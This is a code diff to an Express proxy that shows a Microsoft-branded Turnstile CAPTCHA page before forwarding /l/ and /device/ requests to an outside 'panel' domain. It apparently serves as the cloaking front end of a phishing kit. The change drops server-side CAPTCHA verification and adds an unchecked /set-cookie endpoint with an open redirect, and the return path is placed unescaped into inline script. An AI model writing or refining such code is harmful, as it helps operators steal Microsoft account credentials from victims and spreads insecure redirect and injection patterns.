@@ -6,19 +6,30 @@ const port = process.env.PORT || 3000;
 app.set('trust proxy', 1);
 
 const PANEL = 'portal42-343.sbs';
-const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
-const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY'; // ⚠️ Keep this – required for verification
+const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm'; // Only site key needed
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
-// ---- CAPTCHA PAGE (uses your design) ----
+// ---- CAPTCHA PAGE ----
 app.get('/captcha', (req, res) => {
     let returnPath = req.query.return || '/';
     if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
     if (!returnPath.startsWith('/')) returnPath = '/' + returnPath;
     res.send(getCaptchaHTML(SITE_KEY, returnPath));
+});
+
+// ---- SET COOKIE ENDPOINT (No verification, just sets cookie and redirects) ----
+app.get('/set-cookie', (req, res) => {
+    const returnPath = req.query.return || '/';
+    res.cookie('captcha_passed', 'true', {
+        maxAge: 300000,
+        httpOnly: true,
+        secure: true,
+        sameSite: 'lax'
+    });
+    res.redirect(returnPath);
 });
 
 // ---- PROTECTED ROUTES - redirect to CAPTCHA ----
@@ -27,36 +38,6 @@ app.get('/l/*', (req, res) => {
 });
 app.get('/device/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
-});
-
-// ---- VERIFICATION (sets cookie and redirects) ----
-app.post('/verify-captcha', async (req, res) => {
-    const token = req.body['cf-turnstile-response'];
-    if (!token) return res.status(400).send('Missing token');
-
-    try {
-        const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `secret=${SECRET_KEY}&response=${token}`
-        });
-        const data = await verify.json();
-        if (data.success) {
-            res.cookie('captcha_passed', 'true', {
-                maxAge: 300000,
-                httpOnly: true,
-                secure: true,
-                sameSite: 'lax'
-            });
-            const returnTo = req.query.return || '/';
-            return res.redirect(returnTo);
-        } else {
-            res.status(400).send('CAPTCHA verification failed');
-        }
-    } catch (e) {
-        console.error('Verification error:', e);
-        res.status(500).send('Server error');
-    }
 });
 
 // ---- PROXY ONLY FOR /l/ AND /device/ (with cookie check) ----
@@ -101,7 +82,7 @@ app.use('*', (req, res) => {
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ---- CAPTCHA HTML (your design, with auto-redirect) ----
+// ---- CAPTCHA HTML (uses only site key) ----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
@@ -119,7 +100,7 @@ function getCaptchaHTML(siteKey, returnPath) {
     .loading { color: #1976d2; padding: 20px; }
     #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
     #dp { margin-top: 20px; }
-    /* Keep all your existing styling for the logo animation etc. */
+    /* Keep your logo animation styles here */
   </style>
 </head>
 <body>
@@ -132,7 +113,6 @@ function getCaptchaHTML(siteKey, returnPath) {
     <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="MS">
   </div>
   <script>
-    // ---- DYNAMIC RETURN PATH ----
     const returnPath = "${returnPath}";
 
     // ---- MESSAGES ----
@@ -145,24 +125,11 @@ function getCaptchaHTML(siteKey, returnPath) {
     cycleMessages();
     setInterval(cycleMessages, 3000);
 
-    // ---- TURNSTILE CALLBACK (auto-redirect) ----
+    // ---- TURNSTILE CALLBACK (redirects to set-cookie endpoint) ----
     function turnstileCallback(token) {
       if (token) {
-        // Send token to backend for verification, then redirect
-        fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: 'cf-turnstile-response=' + token
-        }).then(response => {
-          if (response.redirected) {
-            window.location.href = response.url;
-          } else {
-            // If not redirected, go to returnPath
-            window.location.href = returnPath;
-          }
-        }).catch(() => {
-          window.location.href = returnPath;
-        });
+        // Redirect to /set-cookie which sets the cookie and then redirects to returnPath
+        window.location.href = '/set-cookie?return=' + encodeURIComponent(returnPath);
       }
     }
 
